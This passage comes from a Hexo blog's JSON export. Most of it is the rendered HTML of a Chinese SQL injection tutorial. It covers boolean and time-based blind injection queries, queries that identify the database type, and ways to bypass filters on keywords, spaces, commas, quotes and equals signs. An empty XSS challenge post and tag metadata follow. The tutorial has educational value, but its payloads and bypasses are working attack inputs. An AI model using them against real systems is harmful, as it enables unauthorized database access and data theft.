class=\"hljs-comment\">--+</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"判断数据库名\"><a href=\"#判断数据库名\" class=\"headerlink\" title=\"判断数据库名\"></a>判断数据库名</h5><p>使用 sbustr 函数一位一位截取数据库名，如果为真，则页面正常显示</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;2&#x27;</span> <span class=\"hljs-keyword\">and</span> substr(database(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>)<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;s&#x27;</span> <span class=\"hljs-comment\">--+</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-2-3-2-时间盲注\"><a href=\"#2-2-3-2-时间盲注\" class=\"headerlink\" title=\"2.2.3.2 时间盲注\"></a>2.2.3.2 时间盲注</h4><p>当页面没有布尔状态时，可以通过观察页面响应时间是否变长来判断输入的条件是否正确。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1&#x27;</span> <span class=\"hljs-keyword\">and</span> sleep(<span class=\"hljs-number\">10</span>) <span class=\"hljs-comment\">-- +&#x27; LIMIT 0,1;</span><br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1&#x27;</span> <span class=\"hljs-keyword\">and</span> if((length(database())<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">8</span>),sleep(<span class=\"hljs-number\">10</span>),<span class=\"hljs-number\">1</span>) <span class=\"hljs-comment\">--+</span><br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1&#x27;</span> <span class=\"hljs-keyword\">and</span> if((substr(database(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>)<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;s&#x27;</span>),sleep(<span class=\"hljs-number\">10</span>),<span class=\"hljs-number\">1</span>) <span class=\"hljs-comment\">--+</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"3-数据库判断\"><a href=\"#3-数据库判断\" class=\"headerlink\" title=\"3 数据库判断\"></a>3 数据库判断</h1><h2 id=\"3-1-常见前端与数据库类型匹配\"><a href=\"#3-1-常见前端与数据库类型匹配\" class=\"headerlink\" title=\"3.1 常见前端与数据库类型匹配\"></a>3.1 常见前端与数据库类型匹配</h2><table>\n<thead>\n<tr>\n<th>前端语言</th>\n<th>数据库</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>sap</td>\n<td>sql server，Access</td>\n</tr>\n<tr>\n<td>.net</td>\n<td>sql server</td>\n</tr>\n<tr>\n<td>php</td>\n<td>PostgreSQL, Mysql</td>\n</tr>\n<tr>\n<td>java</td>\n<td>mysql, oracle</td>\n</tr>\n</tbody></table>\n<h2 id=\"3-2-数据库标志性信息\"><a href=\"#3-2-数据库标志性信息\" class=\"headerlink\" title=\"3.2 数据库标志性信息\"></a>3.2 数据库标志性信息</h2><table>\n<thead>\n<tr>\n<th>数据库</th>\n<th>信息查询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>oracle</td>\n<td>select@@version –</td>\n</tr>\n<tr>\n<td>sql server</td>\n<td>select banner from v$version</td>\n</tr>\n<tr>\n<td>mysql</td>\n<td>select @@version, version() –, lenth(user)&gt;0</td>\n</tr>\n<tr>\n<td>postgreSQL</td>\n<td>select version() –</td>\n</tr>\n</tbody></table>\n<h2 id=\"3-3-字符串处理方式\"><a href=\"#3-3-字符串处理方式\" class=\"headerlink\" title=\"3.3 字符串处理方式\"></a>3.3 字符串处理方式</h2><table>\n<thead>\n<tr>\n<th>数据库</th>\n<th>处理方式</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>sql server</td>\n<td>id&#x3D;1 and ‘a’+’b’&#x3D;’ab’ –</td>\n</tr>\n<tr>\n<td>mssql</td>\n<td>id&#x3D;1 and ‘a’+’b’&#x3D;’ab’</td>\n</tr>\n<tr>\n<td>mysql</td>\n<td>id&#x3D;1 and ‘a’+’b’&#x3D;’ab’, ‘ab’&#x3D;concat(‘a’,’b’)</td>\n</tr>\n<tr>\n<td>oracle</td>\n<td>id&#x3D;1 and ‘a’+’b’&#x3D;’a’||’b’, ‘ab’&#x3D;concat(‘a’,’b’)</td>\n</tr>\n<tr>\n<td>postgresql</td>\n<td>id&#x3D;1 and ‘a’+’b’&#x3D;’a’||’b’, ‘ab’&#x3D;concat(‘a’,’b’)</td>\n</tr>\n</tbody></table>\n<h2 id=\"3-4-特殊符号与注释\"><a href=\"#3-4-特殊符号与注释\" class=\"headerlink\" title=\"3.4 特殊符号与注释\"></a>3.4 特殊符号与注释</h2><ol>\n<li>null 和 %00 是Access支持的注释。</li>\n<li># 是MySQL中的注释符，返回错误说明该注入点可能不是MySQL，另外也支持’– ‘,和&#x2F;* *&#x2F;注释（注意mysql使用– 时需要后面添加空格）</li>\n<li>– 和 &#x2F;* *&#x2F; 是Oracle，SQL server和MSSQL支持的注释符，如果正常，说明可能就是这仨了。</li>\n<li>; 是子句查询标识符，在Oracle中不支持多行查询，返回错误，很可能是Oracle数据库。</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-string\">&#x27; and exists (select count(*) from sysobjects) &gt;0 正常，就是MSSQL数据库</span><br><span class=\"hljs-string\">&#x27;</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">exists</span> (<span class=\"hljs-keyword\">select</span> <span class=\"hljs-built_in\">count</span>(<span class=\"hljs-operator\">*</span>) <span class=\"hljs-keyword\">from</span> msysobjects) <span class=\"hljs-operator\">&gt;</span><span class=\"hljs-number\">0</span> 两条都不正常，是Access数据库<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"4-绕过\"><a href=\"#4-绕过\" class=\"headerlink\" title=\"4 绕过\"></a>4 绕过</h1><h2 id=\"4-1-关键字过滤\"><a href=\"#4-1-关键字过滤\" class=\"headerlink\" title=\"4.1 关键字过滤\"></a>4.1 关键字过滤</h2><ul>\n<li>第一种是替换关键字，这种方式可以直接通过双写关键词等方式来进行绕过；</li>\n<li>第二种是关键词直接拦截，这种情况下可以通过变换函数等方式来进行绕过。</li>\n</ul>\n<h2 id=\"4-2-空格过滤\"><a href=\"#4-2-空格过滤\" class=\"headerlink\" title=\"4.2 空格过滤\"></a>4.2 空格过滤</h2><ul>\n<li>使用&#x2F;**&#x2F;即SQL语句中的注释语句来绕过。</li>\n<li>使用双写URL编码绕过，例如(%20 → %2%200)。</li>\n<li>通过特殊符号（反引号、加号、括号等等），绕过空格。（在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。）</li>\n<li>通过科学计数法绕过：where id&#x3D;0e1union select 1,2</li>\n<li>Fuzz所有字符，查找可替代空格的字符例如 %09 %0a %0b %0c %0d。</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>URL编码</th>\n<th>符号</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>%09</td>\n<td>TAB 键（水平）</td>\n</tr>\n<tr>\n<td>%0a</td>\n<td>新建一行</td>\n</tr>\n<tr>\n<td>%0c</td>\n<td>新的一页</td>\n</tr>\n<tr>\n<td>%0d</td>\n<td>return 功能</td>\n</tr>\n<tr>\n<td>%0b</td>\n<td>TAB 键（垂直）</td>\n</tr>\n<tr>\n<td>%a0</td>\n<td>空格</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>数据库</th>\n<th>空白字符</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>SQLite3</td>\n<td>0A 0D 0C 09 20</td>\n</tr>\n<tr>\n<td>MYSQL5</td>\n<td>09 0A 0B 0C 0D A0 20</td>\n</tr>\n<tr>\n<td>PosgresSQL</td>\n<td>0A 0D 0C 09 20</td>\n</tr>\n<tr>\n<td>Oracle 11g</td>\n<td>00 0A 0D 0C 09 20</td>\n</tr>\n<tr>\n<td>MSSQL</td>\n<td>01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20</td>\n</tr>\n</tbody></table>\n<h2 id=\"4-3-逗号过滤-x2F-拦截\"><a href=\"#4-3-逗号过滤-x2F-拦截\" class=\"headerlink\" title=\"4.3 逗号过滤&#x2F;拦截\"></a>4.3 逗号过滤&#x2F;拦截</h2><p>拦截逗号后，意味着大部分的联合查询注入都失效，这个时候可以尝试进行盲注。</p>\n<p>substring和if语句都用到了逗号，因此无法使用。</p>\n<p>substring可以用substr()函数来进行代替，if语句可以通过and语句来进行代替。</p>\n<h2 id=\"4-4-单引号拦截-x2F-过滤-x2F-转义\"><a href=\"#4-4-单引号拦截-x2F-过滤-x2F-转义\" class=\"headerlink\" title=\"4.4 单引号拦截&#x2F;过滤&#x2F;转义\"></a>4.4 单引号拦截&#x2F;过滤&#x2F;转义</h2><p>当引号存在过滤和转义的情况下，可以这样处理：</p>\n<h3 id=\"4-4-1-利用编码特性绕过。（宽字节注入）\"><a href=\"#4-4-1-利用编码特性绕过。（宽字节注入）\" class=\"headerlink\" title=\"4.4.1 利用编码特性绕过。（宽字节注入）\"></a>4.4.1 利用编码特性绕过。（宽字节注入）</h3><p>比较典型的使用编码就是GBK编码：使用前面的字符吃掉后面的字符(斜杆)。</p>\n<p>待补充</p>\n<h3 id=\"4-4-2-利用反斜杠-绕过\"><a href=\"#4-4-2-利用反斜杠-绕过\" class=\"headerlink\" title=\"4.4.2 利用反斜杠\\绕过\"></a>4.4.2 利用反斜杠\\绕过</h3><p>待补充</p>\n<h3 id=\"4-4-3-将-utf-8-转换为-utf-16-或-utf-32\"><a href=\"#4-4-3-将-utf-8-转换为-utf-16-或-utf-32\" class=\"headerlink\" title=\"4.4.3 将 utf-8 转换为 utf-16 或 utf-32\"></a>4.4.3 将 utf-8 转换为 utf-16 或 utf-32</h3><p>待补充</p>\n<h2 id=\"4-5-数字被过滤-x2F-拦截绕过\"><a href=\"#4-5-数字被过滤-x2F-拦截绕过\" class=\"headerlink\" title=\"4.5 数字被过滤&#x2F;拦截绕过\"></a>4.5 数字被过滤&#x2F;拦截绕过</h2><p>数字被屏蔽时，用响应函数结果来构造。</p>\n<ul>\n<li>ceil() ：为向上取整函数</li>\n<li>floor()：为向下取整函数</li>\n<li>! ~~：起到取反的效果</li>\n<li>pi() ：π值</li>\n<li>version()：利用当前版本号进行数字的构造</li>\n<li>false：值为0</li>\n<li>true：值为1</li>\n</ul>\n<h2 id=\"4-6-等号过滤\"><a href=\"#4-6-等号过滤\" class=\"headerlink\" title=\"4.6 等号过滤\"></a>4.6 等号过滤</h2><ul>\n<li>当等于号&#x3D;呗过滤时，可以使用：like,in 等字符替换</li>\n</ul>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\">?id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">&#x27; or &#x27;</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">&#x27; IN (&#x27;</span><span class=\"hljs-number\">1234</span><span class=\"hljs-string\">&#x27;)#</span><br><span class=\"hljs-string\">?id=1&#x27;</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">like</span> <span class=\"hljs-number\">1</span>#<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"4-7-其他关键字过滤-x2F-拦截绕过\"><a href=\"#4-7-其他关键字过滤-x2F-拦截绕过\" class=\"headerlink\" title=\"4.7 其他关键字过滤&#x2F;拦截绕过\"></a>4.7 其他关键字过滤&#x2F;拦截绕过</h2><p>关键字被过滤时，可以通过双写或大小写、其他编码例如十六进制、URL编码来进行绕过：</p>\n<table>\n<thead>\n<tr>\n<th>关键字</th>\n<th>双写</th>\n<th>大小写</th>\n<th>其他编码</th>\n<th>符号</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>and</td>\n<td>aandnd</td>\n<td>and</td>\n<td>an\\x64</td>\n<td>&amp;&amp;</td>\n</tr>\n<tr>\n<td>select</td>\n<td>selselectect</td>\n<td>SelECt</td>\n<td>selec\\x74</td>\n<td></td>\n</tr>\n<tr>\n<td>or</td>\n<td>oorr</td>\n<td>oR</td>\n<td>o\\x72</td>\n<td>||</td>\n</tr>\n<tr>\n<td>union</td>\n<td>uniunionon</td>\n<td>uNioN</td>\n<td>unio\\x6e</td>\n<td></td>\n</tr>\n</tbody></table>\n<h1 id=\"参考内容\"><a href=\"#参考内容\" class=\"headerlink\" title=\"参考内容\"></a>参考内容</h1><p><a href=\"https://johnfrod.top/%e5%ae%89%e5%85%a8/sql%e6%b3%a8%e5%85%a5%e6%80%bb%e7%bb%93/\">sql注入总结</a></p>\n<p><a href=\"https://files.cnblogs.com/files/lcamry/mysql-injection.pdf\">注入天书</a></p>\n"},{"title":"耗子XSS","excerpt":"源码、XSS……","index_img":"/img/article-head/-.png","date":"2022-08-04T04:30:25.000Z","updated":"2022-08-04T04:30:25.000Z","hide":false,"_content":"\n- [](#)\n\n\n[耗子XSS](https://xss.haozi.me/)\n\n## \n\n源码\n```\n\n···\n\n\n\n\n\n","source":"_posts/2022-08-10.耗子XSS.md","raw":"---\ntitle: 耗子XSS\nexcerpt: 源码、XSS……\nindex_img: /img/article-head/-.png\ndate: \"2022/8/4 12:30:25\"\nupdated: \"2022/8/4 12:30:25\"\nhide: false\ntags:\n- Security\n- audit\n- XSS\ncategories:\n- Security\n- audit\n- XSS\n---\n\n- [](#)\n\n\n[耗子XSS](https://xss.haozi.me/)\n\n## \n\n源码\n```\n\n···\n\n\n\n\n\n","slug":"2022-08-10.耗子XSS","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cl6nug9bc002eoqna6m1n1yt1","content":"<ul>\n<li><a href=\"#\"></a></li>\n</ul>\n<p><a href=\"https://xss.haozi.me/\">耗子XSS</a></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>源码</p>\n<pre><code class=\"hljs\">\n···\n\n\n\n\n</code></pre>\n","site":{"data":{}},"wordcount":10,"more":"<ul>\n<li><a href=\"#\"></a></li>\n</ul>\n<p><a href=\"https://xss.haozi.me/\">耗子XSS</a></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>源码</p>\n<pre><code>\n···\n\n\n\n\n</code></pre>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cl6nug9au0000oqnadbfzhubv","category_id":"cl6nug9ay0003oqna7y9w6ivj","_id":"cl6nug9b2000doqnahgfhbul3"},{"post_id":"cl6nug9ax0002oqnaffoi5e90","category_id":"cl6nug9b10008oqna30iz1ief","_id":"cl6nug9b4000joqna907bfcb2"},{"post_id":"cl6nug9b00007oqnadpxef0d7","category_id":"cl6nug9b5000moqna2tvce1vf","_id":"cl6nug9b8001doqna7z0k55eb"},{"post_id":"cl6nug9b00007oqnadpxef0d7","category_id":"cl6nug9b80017oqnaesyd9zde","_id":"cl6nug9b9001hoqna97bbbkra"},{"post_id":"cl6nug9b2000boqnadr2d65cz","category_id":"cl6nug9b5000moqna2tvce1vf","_id":"cl6nug9b9001ioqna5aic0eef"},{"post_id":"cl6nug9b2000boqnadr2d65cz","category_id":"cl6nug9b8001aoqnad5t1bpjo","_id":"cl6nug9b9001loqnacz4v317h"},{"post_id":"cl6nug9b2000coqna4o711odh","category_id":"cl6nug9b6000roqna0j1r6mhq","_id":"cl6nug9b9001noqna7gxoenfq"},{"post_id":"cl6nug9b2000coqna4o711odh","category_id":"cl6nug9b8001eoqnactyhe3ss","_id":"cl6nug9ba001roqna6kutb7n6"},{"post_id":"cl6nug9b3000goqnacc4g0o6o","category_id":"cl6nug9b3000eoqna79r98edx","_id":"cl6nug9ba001soqna95eh3tst"},{"post_id":"cl6nug9b3000goqnacc4g0o6o","category_id":"cl6nug9b6000voqnad3lngxi7","_id":"cl6nug9ba001voqna584xh3sx"},{"post_id":"cl6nug9b3000goqnacc4g0o6o","category_id":"cl6nug9b9001joqnaaxui8q38","_id":"cl6nug9ba001xoqna2yax62gw"},{"post_id":"cl6nug9az0005oqna5co8g8zl","category_id":"cl6nug9b3000eoqna79r98edx","_id":"cl6nug9bb0021oqnacwdi03r8"},{"post_id":"cl6nug9az0005oqna5co8g8zl","category_id":"cl6nug9b6000voqnad3lngxi7","_id":"cl6nug9bb0023oqnad2uafpym"},{"post_id":"cl6nug9az0005oqna5co8g8zl","category_id":"cl6nug9b9001ooqnagwxa3yo3","_id":"cl6nug9bb0024oqna1u2ifrn1"},{"post_id":"cl6nug9b3000ioqna6q0yhj2s","category_id":"cl6nug9b3000eoqna79r98edx","_id":"cl6nug9bb0026oqna9qfkb1og"},{"post_id":"cl6nug9b3000ioqna6q0yhj2s","category_id":"cl6nug9b6000voqnad3lngxi7","_id":"cl6nug9bb0028oqna4izd4erw"},{"post_id":"cl6nug9b3000ioqna6q0yhj2s","category_id":"cl6nug9b9001joqnaaxui8q38","_id":"cl6nug9bb002aoqnabtegept6"},{"post_id":"cl6nug9b00006oqna6blagnwm","category_id":"cl6nug9b3000eoqna79r98edx","_id":"cl6nug9bb002boqnaeg3ted1h"},{"post_id":"cl6nug9b00006oqna6blagnwm","category_id":"cl6nug9b6000voqnad3lngxi7","_id":"cl6nug9bb002coqna9oure32c"},{"post_id":"cl6nug9b00006oqna6blagnwm","category_id":"cl6nug9b9001joqnaaxui8q38","_id":"cl6nug9bb002doqna5y9k1se1"},{"post_id":"cl6nug9bc002eoqna6m1n1yt1","category_id":"cl6nug9b3000eoqna79r98edx","_id":"cl6nug9bd002moqna5h211ocp"},{"post_id":"cl6nug9bc002eoqna6m1n1yt1","category_id":"cl6nug9bc002goqna95y9bc2f","_id":"cl6nug9bd002noqna065m5cor"},{"post_id":"cl6nug9bc002eoqna6m1n1yt1","category_id":"cl6nug9bc002ioqnaf9tgdujo","_id":"cl6nug9bd002ooqna2hzm4mdt"}],"PostTag":[{"post_id":"cl6nug9au0000oqnadbfzhubv","tag_id":"cl6nug9az0004oqna6axp1mpk","_id":"cl6nug9b1000aoqna1aqxbsql"},{"post_id":"cl6nug9ax0002oqnaffoi5e90","tag_id":"cl6nug9b10009oqna2sgveg5l","_id":"cl6nug9b3000hoqnafp2p2fxn"},{"post_id":"cl6nug9az0005oqna5co8g8zl","tag_id":"cl6nug9b3000foqnaggs5attk","_id":"cl6nug9b6000qoqna6slldeah"},{"post_id":"cl6nug9az0005oqna5co8g8zl","tag_id":"cl6nug9b4000loqnaggcvhgyj","_id":"cl6nug9b6000soqna7hvv4ybo"},{"post_id":"cl6nug9az0005oqna5co8g8zl","tag_id":"cl6nug9b5000noqna2wwe5w2a","_id":"cl6nug9b6000uoqna54p06piy"},{"post_id":"cl6nug9b00006oqna6blagnwm","tag_id":"cl6nug9b3000foqnaggs5attk","_id":"cl6nug9b7000zoqnaaot43ujs"},{"post_id":"cl6nug9b00006oqna6blagnwm","tag_id":"cl6nug9b4000loqnaggcvhgyj","_id":"cl6nug9b70010oqnabj4khmdd"},{"post_id":"cl6nug9b00006oqna6blagnwm","tag_id":"cl6nug9b6000woqnah1oxgpmp","_id":"cl6nug9b70013oqnacuh127gp"},{"post_id":"cl6nug9b00007oqnadpxef0d7","tag_id":"cl6nug9b7000yoqnah0m47b3g","_id":"cl6nug9b80016oqnae1h2cc6k"},{"post_id":"cl6nug9b00007oqnadpxef0d7","tag_id":"cl6nug9b70012oqna82tv5yae","_id":"cl6nug9b80018oqna6bfb4nwq"},{"post_id":"cl6nug9b2000boqnadr2d65cz","tag_id":"cl6nug9b7000yoqnah0m47b3g","_id":"cl6nug9b8001coqna8mmx4h1e"},{"post_id":"cl6nug9b2000boqnadr2d65cz","tag_id":"cl6nug9b80019oqnah8n6hj2o","_id":"cl6nug9b9001foqna49ebba19"},{"post_id":"cl6nug9b2000coqna4o711odh","tag_id":"cl6nug9b8001boqna65ym3k85","_id":"cl6nug9b9001moqnaa0hr1b5z"},{"post_id":"cl6nug9b2000coqna4o711odh","tag_id":"cl6nug9b9001goqna97k86kgd","_id":"cl6nug9ba001poqna3v7w5kgb"},{"post_id":"cl6nug9b3000goqnacc4g0o6o","tag_id":"cl6nug9b3000foqnaggs5attk","_id":"cl6nug9ba001woqna3yl40wwr"},{"post_id":"cl6nug9b3000goqnacc4g0o6o","tag_id":"cl6nug9b4000loqnaggcvhgyj","_id":"cl6nug9ba001yoqnab6m7cvow"},{"post_id":"cl6nug9b3000goqnacc4g0o6o","tag_id":"cl6nug9b6000woqnah1oxgpmp","_id":"cl6nug9bb0022oqnag9m8d0sv"},{"post_id":"cl6nug9b3000ioqna6q0yhj2s","tag_id":"cl6nug9b3000foqnaggs5attk","_id":"cl6nug9bb0025oqna91yueu0s"},{"post_id":"cl6nug9b3000ioqna6q0yhj2s","tag_id":"cl6nug9b4000loqnaggcvhgyj","_id":"cl6nug9bb0027oqna7dr5e9cs"},{"post_id":"cl6nug9b3000ioqna6q0yhj2s","tag_id":"cl6nug9b6000woqnah1oxgpmp","_id":"cl6nug9bb0029oqna5a7vcgvh"},{"post_id":"cl6nug9bc002eoqna6m1n1yt1","tag_id":"cl6nug9b3000foqnaggs5attk","_id":"cl6nug9bd002joqna78kj58ui"},{"post_id":"cl6nug9bc002eoqna6m1n1yt1","tag_id":"cl6nug9bc002foqnad29t0t8z","_id":"cl6nug9bd002koqna046h90s6"},{"post_id":"cl6nug9bc002eoqna6m1n1yt1","tag_id":"cl6nug9bc002hoqna8ais82sy","_id":"cl6nug9bd002loqna8fk7bajs"}],"Tag":[{"name":"git","_id":"cl6nug9az0004oqna6axp1mpk"},{"name":"docker","_id":"cl6nug9b10009oqna2sgveg5l"},{"name":"Security","_id":"cl6nug9b3000foqnaggs5attk"},{"name":"PenTest","_id":"cl6nug9b4000loqnaggcvhgyj"},{"name":"信息收集","_id":"cl6nug9b5000noqna2wwe5w2a"},{"name":"经典漏洞","_id":"cl6nug9b6000woqnah1oxgpmp"},{"name":"Linux","_id":"cl6nug9b7000yoqnah0m47b3g"},{"name":"Gentoo","_id":"cl6nug9b70012oqna82tv5yae"},{"name":"kvm","_id":"cl6nug9b80019oqnah8n6hj2o"},{"name":"ssh","_id":"cl6nug9b8001boqna65ym3k85"},{"name":"sshfs","_id":"cl6nug9b9001goqna97k86kgd"},{"name":"audit","_id":"cl6nug9bc002foqnad29t0t8z"},{"name":"XSS","_id":"cl6nug9bc002hoqna8ais82sy"}]}}